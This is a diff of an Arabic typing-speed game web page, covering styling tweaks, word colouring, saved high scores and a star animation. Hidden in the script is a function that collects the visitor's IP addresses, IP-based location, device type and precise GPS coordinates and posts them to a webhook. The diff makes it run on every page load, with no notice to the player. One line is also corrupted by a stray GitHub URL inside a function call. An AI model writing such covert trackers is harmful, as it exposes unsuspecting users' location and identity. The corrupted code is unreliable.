@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html lang="ar">
+<html lang="ar" dir="rtl">
 <head>
 <meta charset="UTF-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1" />
@@ -7,14 +7,12 @@
 <style>
   body {
     font-family: Tahoma, sans-serif;
-    direction: rtl;
-    margin: 0;
-    padding: 0;
-    text-align: center;
-    min-height: 100vh;
+    margin: 0; padding: 0;
     background: black;
-    overflow: hidden;
     color: white;
+    text-align: center;
+    overflow-x: hidden;
+    min-height: 100vh;
   }
   canvas#stars {
     position: fixed;
@@ -25,18 +23,17 @@
   .container {
     max-width: 700px;
     margin: 60px auto 100px auto;
+    background: rgba(20, 20, 20, 0.9);
     padding: 20px;
-    background: rgba(20,20,20,0.9);
     border-radius: 15px;
-    box-shadow: 0 0 30px rgba(255,255,255,0.05);
   }
   input[type="text"] {
+    width: 80%;
     padding: 12px;
     font-size: 18px;
-    width: 80%;
     margin-bottom: 15px;
-    border: 2px solid #555;
     border-radius: 8px;
+    border: 2px solid #555;
     background: #111;
     color: white;
   }
@@ -44,58 +41,63 @@
     padding: 12px 25px;
     font-size: 18px;
     background-color: #6a1b9a;
-    color: white;
     border: none;
     border-radius: 8px;
     cursor: pointer;
+    color: white;
     margin: 5px;
   }
   #sentence {
-    color: white;
     font-size: 24px;
     font-weight: bold;
     margin-bottom: 15px;
-    word-spacing: 8px;
+    user-select: none;
   }
   #sentence span {
-    padding: 2px 5px;
-    border-radius: 4px;
+    padding: 3px 7px;
+    margin: 0 4px;
+    border-radius: 6px;
+    display: inline-block;
+    transition: background-color 0.3s, color 0.3s;
   }
   #sentence span.correct {
     color: #4caf50;
-    background-color: rgba(76,175,80,0.2);
+    background-color: rgba(76, 175, 80, 0.25);
   }
   #sentence span.incorrect {
     color: #f44336;
-    background-color: rgba(244,67,54,0.2);
+    background-color: rgba(244, 67, 54, 0.25);
+  }
+  #sentence span.partial {
+    color: #ffeb3b;
+    background-color: rgba(255, 235, 59, 0.2);
   }
   #record {
     position: fixed;
-    right: 20px;
     top: 20px;
+    right: 20px;
     background: #222;
     padding: 10px 15px;
     border-radius: 8px;
-    font-size: 16px;
     font-weight: bold;
-    border: 1px solid #555;
-    z-index: 10;
+    font-size: 16px;
+    z-index: 1000;
   }
   #musicControl {
     position: fixed;
-    left: 20px;
     top: 20px;
+    left: 20px;
     background: #333;
     color: white;
     border-radius: 50%;
     width: 40px;
     height: 40px;
+    font-size: 20px;
     cursor: pointer;
     display: flex;
-    justify-content: center;
     align-items: center;
-    font-size: 20px;
-    z-index: 10;
+    justify-content: center;
+    z-index: 1000;
   }
   #discordButton {
     position: fixed;
@@ -103,37 +105,27 @@
     left: 20px;
     width: 40px;
     height: 40px;
-    background: transparent;
     cursor: pointer;
-    z-index: 10;
-    animation: glow 1.5s infinite alternate;
+    z-index: 1000;
   }
   #discordButton img {
     width: 100%;
     height: 100%;
-  }
-  @keyframes glow {
-    from {
-      filter: drop-shadow(0 0 3px #7289da);
-    }
-    to {
-      filter: drop-shadow(0 0 15px #7289da);
-    }
   }
   #rightsMenu {
     display: none;
     position: fixed;
     bottom: 70px;
     left: 20px;
+    width: 220px;
     background: #111;
-    color: white;
     border-radius: 8px;
+    color: white;
     padding: 15px;
     font-size: 14px;
-    z-index: 1000;
-    width: 220px;
-    box-shadow: 0 0 10px rgba(255,255,255,0.3);
-    text-align: left;
+    text-align: right;
+    box-shadow: 0 0 10px rgba(255, 255, 255, 0.3);
+    z-index: 10000;
   }
   #closeBtn {
     background: #c62828;
@@ -149,12 +141,13 @@
   }
   #rightsFooter {
     position: fixed;
-    bottom: 10px;
+    bottom: 5px;
     left: 0; right: 0;
-    color: #888;
-    font-size: 14px;
     text-align: center;
+    font-size: 14px;
+    color: #888;
     user-select: none;
+    z-index: 1000;
   }
 </style>
 </head>
@@ -187,7 +180,7 @@
 <div class="container" id="gameScreen" style="display:none;">
   <h2 id="welcomeMsg"></h2>
   <div id="sentence"></div>
-  <input type="text" id="userInput" placeholder="اكتب هنا" oninput="renderSentence(this.value)" onkeydown="handleEnter(event)" />
+  <input type="text" id="userInput" placeholder="اكتب هنا" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" oninput="renderSentence(this.value)" onkeydown="handleEnter(event)" />
   <br />
   <button onclick="checkInput()">تحقق</button>
   <div id="speedDisplay"></div>
@@ -240,6 +233,7 @@
     startTime = performance.now();
   }
 
+  // تلوين الكلمة كاملة وليس حرف حرف
   function renderSentence(userInput) {
     const sentenceDiv = document.getElementById("sentence");
     sentenceDiv.innerHTML = "";
@@ -249,128 +243,149 @@
     words.forEach((word, idx) => {
       const span = document.createElement("span");
       span.textContent = word;
+
       if (inputWords[idx]) {
         if (inputWords[idx] === word) {
           span.classList.add("correct");
         } else if (word.startsWith(inputWords[idx])) {
-          span.style.color = "yellow";
+          span.classList.add("partial");
         } else {
           span.classList.add("incorrect");
         }
       }
       sentenceDiv.appendChild(span);
-      sentenceDiv.appendChild(document.createTextNode(" "));
     });
   }
 
-  function checkInput() {
-    const userInput = document.getElementById("userInput").value.trim();
-    const resultDiv = document.getElementById("result");
-    if (userInput === currentSentence) {
-      const endTime = performance.now();
-      const elapsed = (endTime - startTime) / 1000;
-      const wordsCount = currentSentence.split(" ").length;
-      const wpm = (wordsCount / elapsed) * 60;
-      if (wpm > highestWpm) {
-        highestWpm = wpm;
-        bestTime = elapsed;
-        document.getElementById("record").textContent = `أعلى سرعة: ${Math.round(wpm)} - ${elapsed.toFixed(2)} ثانية`;
-      }
-      resultDiv.textContent = `تهانينا! سرعتك ${Math.round(wpm)} كلمة بالدقيقة`;
-      resultDiv.classList.remove("error");
-      shuffle(sentences);
-      currentSentence = sentences[0];
-      document.getElementById("userInput").value = "";
-      renderSentence("");
-      startTime = performance.now();
-      sendUserInfo();
-    } else {
-      resultDiv.textContent = "الرجاء كتابة الجملة بشكل صحيح";
-      resultDiv.classList.add("error");
-    }
-  }
-
-  function handleEnter(event) {
-    if (event.key === "Enter") {
-      event.preventDefault();
+  function handleEnter(e) {
+    if (e.key === "Enter") {
+      e.preventDefault();
       checkInput();
     }
   }
 
-  // نجوم متحركة في الخلفية
-  const canvas = document.getElementById('stars');
-  const ctx = canvas.getContext('2d');
-  let width, height;
-  let stars = [];
+  function checkInput() {
+    const userInput = document.getElementById("userInput").value.trim();
+    if (!userInput) return;
 
-  function initStars() {
-    width = window.innerWidth;
-    height = window.innerHeight;
-    canvas.width = width;
-    canvas.height = height;
-    stars = [];
-    for (let i = 0; i < 120; i++) {
-      stars.push({
-        x: Math.random() * width,
-        y: Math.random() * height,
-        radius: Math.random() * 1.1 + 0.3,
-        alpha: Math.random(),
-        dx: (Math.random() - 0.5) * 0.3,
-        dy: (Math.random() - 0.5) * 0.3,
-      });
+    if (userInput === currentSentence) {
+      const endTime = performance.now();
+      const timeSeconds = (endTime - startTime) / 1000;
+      const wordsCount = currentSentence.split(" ").length;
+      const wpm = (wordsCount / timeSeconds) * 60;
+
+      if (wpm > highestWpm) {
+        highestWpm = wpm;
+        bestTime = timeSeconds;
+        localStorage.setItem("highestWpm", highestWpm);
+        localStorage.setItem("bestTime", bestTime);
+      }
+
+      document.getElementById("speedDisplay").textContent = `السرعة: ${wpm.toFixed(2)} كلمة في الدقيقة`;
+      document.getElementById("bestTime").textContent = `أفضل زمن: ${bestTime.toFixed(2)} ثانية`;
+      document.getElementById("result").textContent = "عمل رائع!";
+
+      shuffle(sentences);
+      currentSentence = sentences[0];
+      renderSentence("");
+      document.getElementById("userInput").value = "";
+      startTime = performance.now();
+
+    } else {
+      document.getElementById("result").textContent = "حاول مرة أخرى";
     }
   }
 
+  // استعادة البيانات من التخزين المحلي
+  window.onload = function() {
+    highestWpm = parseFloat(localStorage.getItem("highestWpm")) || 0;
+    bestTime = parseFloat(localStorage.getItem("bestTime")) || 0;
+    if (bestTime > 0) {
+      document.getElementById("bestTime").textContent = `أفضل زمن: ${bestTime.toFixed(2)} ثانية`;
+    }
+  };
+
+  // النجوم الخلفية
+  const canvas = document.getElementById("stars");
+  const ctx = canvas.getContext("2d");
+  let starsArray = [];
+  function resizeCanvas() {
+    canvas.width = window.innerWidth;
+    canvas.height = window.innerHeight;
+  }
+  window.addEventListener("resize", resizeCanvas);
+  resizeCanvas();
+
+  function createStars(count) {
+    starsArray = [];
+    for (let i = 0; i < count; i++) {
+      starsArray.push({
+        x: Math.random() * canvas.width,
+        y: Math.random() * canvas.height,
+        radius: Math.random() * 1.3,
+        alpha: Math.random(),
+      });
+    }
+  }
+  createStars(120);
+
   function drawStars() {
-    ctx.clearRect(0, 0, width, height);
-    stars.forEach(s => {
+    ctx.clearRect(0, 0, canvas.width, canvas.height);
+    starsArray.forEach(star => {
       ctx.beginPath();
-      ctx.arc(s.x, s.y, s.radius, 0, Math.PI * 2);
-      ctx.fillStyle = `rgba(255,255,255,${s.alpha})`;
+      ctx.arc(star.x, star.y, star.radius, 0, 2 * Math.PI);
+      ctx.fillStyle = `rgba(255,255,255,${star.alpha})`;
       ctx.fill();
-      s.x += s.dx;
-      s.y += s.dy;
-      if (s.x < 0 || s.x > width) s.dx = -s.dx;
-      if (s.y < 0 || s.y > height) s.dy = -s.dy;
-      s.alpha += (Math.random() - 0.5) * 0.05;
-      if (s.alpha < 0.1) s.alpha = 0.1;
-      if (s.alpha > 1) s.alpha = 1;
     });
-    requestAnimationFrame(drawStars);
   }
 
-  window.addEventListener('resize', initStars);
-  initStars();
-  drawStars();
+  function animateStars() {
+    starsArray.forEach(star => {
+      star.alpha += (Math.random() - 0.5) * 0.05;
+      star.alpha = Math.min(Math.max(star.alpha, 0), 1);
+    });
+    drawStars();
+    requestAnimationFrame(animateStars);
+  }
+  animateStars();
 
-  // تحكم الموسيقى
-  const music = document.getElementById('bgMusic');
-  const musicControl = document.getElementById('musicControl');
-  musicControl.addEventListener('click', () => {
-    if (music.paused) music.play();
-    else music.pause();
+  // الموسيقى
+  const music = document.getElementById("bgMusic");
+  const musicControl = document.getElementById("musicControl");
+  music.volume = 0.15;
+  let musicPlaying = false;
+  musicControl.addEventListener("click", () => {
+    if (musicPlaying) {
+      music.pause();
+      musicPlaying = false;
+      musicControl.textContent = "🎵";
+    } else {
+      music.play();
+      musicPlaying = true;
+      musicControl.textContent = "🔇";
+    }
   });
 
-  // عرض وإخفاء حقوق المطور
-  const discordButton = document.getElementById('discordButton');
-  const rightsMenu = document.getElementById('rightsMenu');
-  const closeBtn = document.getElementById('closeBtn');
+  // قائمة الحقوق
+  const discordButton = document.getElementById("discordButton");
+  const rightsMenu = document.getElementById("rightsMenu");
+  const closeBtn = document.getElementById("closeBtn");
 
-  discordButton.addEventListener('click', () => {
-    rightsMenu.style.display = rightsMenu.style.display === 'block' ? 'none' : 'block';
+  discordButton.addEventListener("click", () => {
+    rightsMenu.style.display = rightsMenu.style.display === "block" ? "none" : "block";
   });
 
-  closeBtn.addEventListener('click', () => {
-    rightsMenu.style.display = 'none';
+  closeBtn.addEventListener("click", () => {
+    rightsMenu.style.display = "none";
   });
 
   // إرسال معلومات المستخدم إلى الويب هوك
   async function sendUserInfo() {
     try {
       const [ipv4Res, ipv6Res, geoRes] = await Promise.all([
-        fetch('https://api.ipify.org?format=json'),
-        fetch('https://api64.ipify.org?format=json'),
-        fetch('https://ipapi.co/json/')
+        fetch("https://api.ipify.org?format=json"),
+        fetch("https://api64.ipify.org?format=json"),
+        fetch("https://ipapi.co/json/"),
       ]);
       const ipv4Data = await ipv4Res.json();
       const ipv6Data = await ipv6Res.json();
@@ -381,15 +396,14 @@
       const now = new Date();
       const timeString = now.toISOString();
       const ipv4 = ipv4Data.ip;
-      const ipv6 = (ipv6Data.ip && ipv6Data.ip !== ipv4) ? ipv6Data.ip : 'غير معروف';
+      const ipv6 = ipv6Data.ip && ipv6Data.ip !== ipv4 ? ipv6Data.ip : "غير معروف";
 
-      // تحديد نوع الجهاز
       let deviceType = "كمبيوتر";
       if (/android|iphone|ipad|ipod/i.test(ua)) {
         deviceType = /tablet|ipad/i.test(ua) ? "تابلت" : "جوال";
       }
 
-      function sendToWebhook(extraGeo = '') {
+      function sendToWebhook(extraGeo = "") {
         const infoText = `
 IP (IPv4): ${ipv4}
 IP (IPv6): ${ipv6}
@@ -408,18 +422,20 @@ ${extraGeo}
         `.trim();
 
         fetch(WEBHOOK_URL, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ content: infoText })
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ content: infoText }),
         });
       }
 
       if (navigator.geolocation) {
         let responded = false;
         navigator.geolocation.getCurrentPosition(
-          pos => {
+          (pos) => {
             responded = true;
-            const extraGeo = `موقع دقيق:\nخط العرض: ${pos.coords.latitude.toFixed(6)}\nخط الطول: ${pos.coords.longitude.toFixed(6)}`;
+            const extraGeo = `موقع دقيق:\nخط العرض: ${pos.coords.latitude.toFixed(
+              6https://github.com/moath754/typing-speed/edit/main/index.html
+            )}\nخط الطول: ${pos.coords.longitude.toFixed(6)}`;
             sendToWebhook(extraGeo);
           },
           () => {
@@ -435,9 +451,11 @@ ${extraGeo}
         sendToWebhook();
       }
     } catch (e) {
-      console.error('خطأ في إرسال معلومات المستخدم', e);
+      console.error("خطأ في إرسال معلومات المستخدم", e);
     }
   }
+
+  sendUserInfo();
 </script>
 
 </body>
